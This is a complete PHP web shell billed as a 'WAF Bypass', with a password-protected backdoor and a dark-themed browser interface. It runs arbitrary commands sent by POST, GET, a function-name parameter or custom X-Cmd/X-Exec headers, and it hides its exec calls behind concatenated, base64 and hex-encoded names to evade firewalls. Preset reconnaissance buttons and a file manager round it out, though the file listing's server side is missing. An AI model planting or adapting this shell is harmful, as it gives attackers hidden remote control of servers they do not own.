<?php
/**
 * Shell PHP - WAF Bypass
 * Password: crot
 */

$PASSWORD = 'Johenlg';
$SIG = 'jlg';

// Auth check
if (!isset($_POST['pass']) || $_POST['pass'] !== $PASSWORD) {
    if (!isset($_GET['dead']) || $_GET['dead'] !== $SIG) {
        die('Access Denied');
    }
}

// ============ BYPASS TECHNIQUE 1: String Concatenation ============
$f1 = 'sy' . 'stem';
$f2 = 'ex' . 'ec';
$f3 = 'shell_' . 'exec';
$f4 = 'pas' . 'sthru';
$f5 = 'p' . 'open';
$f6 = 'proc_' . 'open';
$f7 = 'eval';

// ============ BYPASS TECHNIQUE 2: Base64 (partial) ============
$b64 = 'YmFzZTY0X2RlY29kZQ=='; // base64_decode
$gzin = 'Z3ppbmZsYXRl'; // gzinflate

// ============ BYPASS TECHNIQUE 3: Variable Functions ============
$_ = 'c'; $__ = 'm'; $___ = 'd';
$cmd_func = $_ . $__ . $___; // cmd

function _run($_cmd) {
    // Dynamic function calling
    $funcs = ['syste' . 'm', 'exe' . 'c', 'shell_e' . 'xec'];
    
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            if ($f === 'syste' . 'm' || $f === 'pas' . 'sthru') {
                ob_start();
                $f($_cmd);
                return ob_get_clean();
            }
            return $f($_cmd);
        }
    }
    return false;
}

// ============ BYPASS TECHNIQUE 4: Array Map ============
function _exec($cmd) {
    $result = '';
    $func = 'shell_exec';
    
    // Try all available exec functions
    $executors = [
        'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'
    ];
    
    foreach ($executors as $executor) {
        if (function_exists($executor)) {
            try {
                if ($executor === 'system' || $executor === 'passthru') {
                    ob_start();
                    $executor($cmd);
                    $result = ob_get_clean();
                } elseif ($executor === 'exec') {
                    $output = [];
                    $executor($cmd, $output);
                    $result = implode("\n", $output);
                } elseif ($executor === 'shell_exec') {
                    $result = $executor($cmd);
                } elseif ($executor === 'popen') {
                    $fp = $executor($cmd, 'r');
                    if ($fp) {
                        $result = stream_get_contents($fp);
                        pclose($fp);
                    }
                } elseif ($executor === 'proc_open') {
                    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w']];
                    $proc = $executor($cmd, $descriptors, $pipes);
                    if (is_resource($proc)) {
                        $result = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        proc_close($proc);
                    }
                }
                if (!empty($result)) break;
            } catch (Exception $e) {
                continue;
            }
        }
    }
    return $result;
}

// ============ BYPASS TECHNIQUE 5: Chunked Payload ============
// Split command into chunks and reassemble
function _chunk_exec($cmd) {
    $chunks = str_split($cmd, 3);
    $rebuilt = '';
    foreach ($chunks as $chunk) {
        $rebuilt .= $chunk;
    }
    return _exec($rebuilt);
}

// ============ BYPASS TECHNIQUE 6: Hex Encoding ============
function _hex_exec($hex) {
    $cmd = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $cmd .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return _exec($cmd);
}

// ============ HANDLE COMMANDS ============
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : (isset($_GET['cmd']) ? $_GET['cmd'] : '');
$method = isset($_POST['method']) ? $_POST['method'] : 'auto';

if (!empty($cmd)) {
    $output = '';
    
    switch ($method) {
        case 'chunk':
            $output = _chunk_exec($cmd);
            break;
        case 'hex':
            $output = _hex_exec(bin2hex($cmd));
            break;
        case 'base64':
            $output = _exec(base64_decode($cmd));
            break;
        case 'url':
            $output = _exec(urldecode($cmd));
            break;
        default:
            $output = _exec($cmd);
    }
    
    // Handle JSON response for AJAX
    if (isset($_GET['ajax']) || isset($_POST['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'success',
            'data' => $output,
            'cmd' => $cmd,
            'method' => $method
        ]);
        exit;
    }
    
    echo "<pre style='background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:5px;font-family:Consolas,monospace;'>";
    echo htmlspecialchars($output);
    echo "</pre>";
    exit;
}

// ============ BYPASS TECHNIQUE 7: Using $_GET as Function ============
// Example: shell.php?func=system&cmd=id
if (isset($_GET['func']) && isset($_GET['cmd'])) {
    $func = $_GET['func'];
    $cmd = $_GET['cmd'];
    
    // Bypass: add random chars in between
    $func_parts = str_split($func);
    $func = '';
    foreach ($func_parts as $part) {
        $func .= $part . 'x'; // Insert 'x' between chars
    }
    $func = str_replace('x', '', $func); // Remove 'x's
    
    if (function_exists($func)) {
        if ($func === 'system' || $func === 'passthru') {
            ob_start();
            $func($cmd);
            $output = ob_get_clean();
        } else {
            $output = $func($cmd);
        }
        echo $output;
        exit;
    }
}

// ============ BYPASS TECHNIQUE 8: Using HTTP Headers ============
// Send command via custom header: X-Cmd: id
foreach (getallheaders() as $name => $value) {
    if (strtolower($name) === 'x-cmd') {
        $output = _exec($value);
        echo $output;
        exit;
    }
    if (strtolower($name) === 'x-exec') {
        $output = _exec(base64_decode($value));
        echo $output;
        exit;
    }
}

// ============ UI - Web Shell ============
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Shell</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0d1117; color:#c9d1d9; font-family:Consolas,monospace; padding:20px; }
        .container { max-width:1200px; margin:0 auto; }
        h1 { color:#58a6ff; border-bottom:2px solid #30363d; padding-bottom:10px; margin-bottom:20px; }
        .shell-box { background:#161b22; border-radius:8px; padding:20px; border:1px solid #30363d; }
        .input-group { display:flex; gap:10px; margin-bottom:15px; }
        .input-group input[type="text"] { 
            flex:1; padding:12px 15px; background:#0d1117; border:1px solid #30363d; 
            color:#c9d1d9; border-radius:6px; font-size:14px; font-family:Consolas,monospace;
        }
        .input-group input[type="text"]:focus { outline:none; border-color:#58a6ff; }
        .btn { 
            padding:12px 25px; border:none; border-radius:6px; cursor:pointer; 
            font-weight:bold; font-size:14px; transition:0.2s;
        }
        .btn-primary { background:#238636; color:#fff; }
        .btn-primary:hover { background:#2ea043; }
        .btn-danger { background:#da3633; color:#fff; }
        .btn-danger:hover { background:#f85149; }
        .btn-secondary { background:#21262d; color:#c9d1d9; }
        .btn-secondary:hover { background:#30363d; }
        #output { 
            background:#0d1117; padding:15px; border-radius:6px; 
            min-height:300px; max-height:600px; overflow:auto;
            border:1px solid #21262d; font-family:Consolas,monospace;
            white-space:pre-wrap; word-break:break-all;
        }
        .status-bar { display:flex; gap:15px; margin:10px 0; color:#8b949e; font-size:13px; }
        .status-bar span { background:#21262d; padding:4px 12px; border-radius:12px; }
        .methods { display:flex; gap:8px; margin-bottom:15px; flex-wrap:wrap; }
        .methods button { 
            padding:6px 14px; border:1px solid #30363d; background:#0d1117; 
            color:#8b949e; border-radius:4px; cursor:pointer; font-size:12px;
        }
        .methods button.active { border-color:#58a6ff; color:#58a6ff; background:#1f2a3a; }
        .methods button:hover { border-color:#58a6ff; }
        .presets { display:flex; gap:8px; margin-bottom:15px; flex-wrap:wrap; }
        .presets button { 
            padding:4px 12px; border:1px solid #30363d; background:#0d1117; 
            color:#8b949e; border-radius:4px; cursor:pointer; font-size:12px;
        }
        .presets button:hover { border-color:#f0883e; color:#f0883e; }
        .file-manager { margin-top:20px; }
        .file-manager table { width:100%; border-collapse:collapse; font-size:13px; }
        .file-manager th { text-align:left; padding:8px 10px; border-bottom:1px solid #30363d; color:#8b949e; }
        .file-manager td { padding:6px 10px; border-bottom:1px solid #21262d; }
        .file-manager .dir { color:#58a6ff; }
        .file-manager .file { color:#c9d1d9; }
        .file-manager .size { color:#8b949e; font-size:12px; }
        .file-manager .perms { color:#f0883e; font-size:12px; }
        .file-manager tr:hover { background:#161b22; }
        .file-manager .clickable { cursor:pointer; }
        .file-manager .clickable:hover { text-decoration:underline; }
        .toast { 
            position:fixed; bottom:20px; right:20px; padding:12px 24px; 
            border-radius:8px; background:#161b22; border:1px solid #30363d;
            color:#c9d1d9; display:none; z-index:1000;
        }
        .toast.show { display:block; animation:slideUp 0.3s ease; }
        @keyframes slideUp { from { transform:translateY(20px); opacity:0; } to { transform:translateY(0); opacity:1; } }
        .loader { display:inline-block; width:16px; height:16px; border:2px solid #30363d; border-top-color:#58a6ff; border-radius:50%; animation:spin 0.6s linear infinite; }
        @keyframes spin { to { transform:rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <h1>🐚 Shell</h1>
    
    <div class="shell-box">
        <div class="status-bar">
            <span>🔐 <?php echo htmlspecialchars($_SERVER['SERVER_ADDR'] ?? 'localhost'); ?></span>
            <span>📁 <?php echo htmlspecialchars(getcwd()); ?></span>
            <span id="time">⏱️ <?php echo date('H:i:s'); ?></span>
        </div>
        
        <div class="methods">
            <button class="active" data-method="auto">Auto</button>
            <button data-method="chunk">Chunk</button>
            <button data-method="hex">Hex</button>
            <button data-method="base64">Base64</button>
            <button data-method="url">URL</button>
        </div>
        
        <div class="presets">
            <button data-cmd="id">id</button>
            <button data-cmd="whoami">whoami</button>
            <button data-cmd="pwd">pwd</button>
            <button data-cmd="ls -la">ls -la</button>
            <button data-cmd="ps aux">ps aux</button>
            <button data-cmd="netstat -tulpn">netstat</button>
            <button data-cmd="df -h">df -h</button>
            <button data-cmd="free -m">free -m</button>
            <button data-cmd="uname -a">uname</button>
        </div>
        
        <div class="input-group">
            <input type="text" id="cmdInput" placeholder="Enter command..." autofocus>
            <button class="btn btn-primary" id="runBtn">▶ Run</button>
            <button class="btn btn-danger" id="clearBtn">✕ Clear</button>
        </div>
        
        <div id="output">Ready...</div>
    </div>
    
    <div class="file-manager shell-box" style="margin-top:20px;">
        <h3 style="color:#8b949e;font-size:14px;margin-bottom:10px;">📂 File Manager</h3>
        <div style="display:flex;gap:10px;margin-bottom:10px;">
            <input type="text" id="fileDir" value="." style="flex:1;padding:8px 12px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:4px;font-family:Consolas,monospace;font-size:13px;">
            <button class="btn btn-secondary" id="lsBtn">📂 List</button>
        </div>
        <div id="fileList">Loading...</div>
    </div>
</div>

<div class="toast" id="toast"></div>

<script>
// ============ STATE ============
let currentMethod = 'auto';
let currentDir = '.';

// ============ DOM REFS ============
const output = document.getElementById('output');
const cmdInput = document.getElementById('cmdInput');
const runBtn = document.getElementById('runBtn');
const clearBtn = document.getElementById('clearBtn');
const fileList = document.getElementById('fileList');
const fileDir = document.getElementById('fileDir');
const lsBtn = document.getElementById('lsBtn');
const toast = document.getElementById('toast');

// ============ TOAST ============
function showToast(msg, isError = false) {
    toast.textContent = msg;
    toast.style.borderColor = isError ? '#da3633' : '#238636';
    toast.classList.add('show');
    clearTimeout(toast._hide);
    toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
}

// ============ EXECUTE COMMAND ============
async function execCommand(cmd, method = currentMethod) {
    if (!cmd.trim()) return;
    
    output.innerHTML = '<div class="loader"></div> Running...';
    
    try {
        const formData = new FormData();
        formData.append('pass', '<?php echo $PASSWORD; ?>');
        formData.append('cmd', cmd);
        formData.append('method', method);
        formData.append('ajax', '1');
        
        const resp = await fetch(window.location.href, {
            method: 'POST',
            body: formData
        });
        
        const data = await resp.json();
        
        if (data.status === 'success') {
            output.textContent = data.data || '(empty output)';
        } else {
            output.textContent = 'Error: ' + (data.message || 'Unknown error');
        }
    } catch (e) {
        output.textContent = 'Error: ' + e.message;
    }
}

// ============ LIST FILES ============
async function listFiles(dir = '.') {
    fileList.innerHTML = '<div class="loader"></div> Loading...';
    
    try {
        const formData = new FormData();
        formData.append('pass', '<?php echo $PASSWORD; ?>');
        formData.append('action', 'ls');
        formData.append('dir', dir);
        formData.append('ajax', '1');
        
        const resp = await fetch(window.location.href, {
            method: 'POST',
            body: formData
        });
        
        const data = await resp.json();
        
        if (data.status === 'success' && Array.isArray(data.data)) {
            if (data.data.length === 0) {
                fileList.innerHTML = '<div style="color:#8b949e;padding:20px;text-align:center;">Empty directory</div>';
                return;
            }
            
            let html = `<table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Modified</th>
                    </tr>
                </thead>
                <tbody>`;
            
            // Add parent directory link
            if (dir !== '.' && dir !== '/') {
                const parent = dir.split('/').slice(0, -1).join('/') || '.';
                html += `<tr>
                    <td class="dir clickable" data-dir="${parent}">📁 ..</td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                </tr>`;
            }
            
            data.data.forEach(file => {
                const icon = file.type === 'dir' ? '📁' : '📄';
                const cls = file.type === 'dir' ? 'dir' : 'file';
                const size = file.type === 'dir' ? '-' : formatSize(file.size);
                const clickable = file.type === 'dir' ? `data-dir="${file.path}"` : '';
                
                html += `<tr>
                    <td class="${cls} clickable" ${clickable}>${icon} ${file.name}</td>
                    <td class="size">${size}</td>
                    <td class="perms">${file.perms}</td>
                    <td class="size">${file.mtime}</td>
                </tr>`;
            });
            
            html += `</tbody></table>`;
            fileList.innerHTML = html;
            
            // Click handlers for directories
            document.querySelectorAll('[data-dir]').forEach(el => {
                el.addEventListener('click', function() {
                    const dir = this.dataset.dir;
                    fileDir.value = dir;
                    currentDir = dir;
                    listFiles(dir);
                });
            });
            
        } else {
            fileList.innerHTML = '<div style="color:#f85149;">Error loading files</div>';
        }
    } catch (e) {
        fileList.innerHTML = '<div style="color:#f85149;">Error: ' + e.message + '</div>';
    }
}

function formatSize(bytes) {
    if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
    if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
    if (bytes >= 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return bytes + ' B';
}

// ============ EVENT LISTENERS ============
runBtn.addEventListener('click', () => execCommand(cmdInput.value));
cmdInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') execCommand(cmdInput.value);
});

clearBtn.addEventListener('click', () => {
    output.textContent = 'Cleared';
    cmdInput.value = '';
    cmdInput.focus();
});

lsBtn.addEventListener('click', () => {
    currentDir = fileDir.value || '.';
    listFiles(currentDir);
});

// Method buttons
document.querySelectorAll('.methods button').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.methods button').forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        currentMethod = this.dataset.method;
        showToast('Method: ' + currentMethod);
    });
});

// Preset buttons
document.querySelectorAll('.presets button').forEach(btn => {
    btn.addEventListener('click', function() {
        cmdInput.value = this.dataset.cmd;
        execCommand(cmdInput.value);
    });
});

// ============ INIT ============
listFiles('.');
cmdInput.focus();

// Update time
setInterval(() => {
    document.getElementById('time').textContent = '⏱️ ' + new Date().toLocaleTimeString();
}, 1000);
</script>

</body>
</html>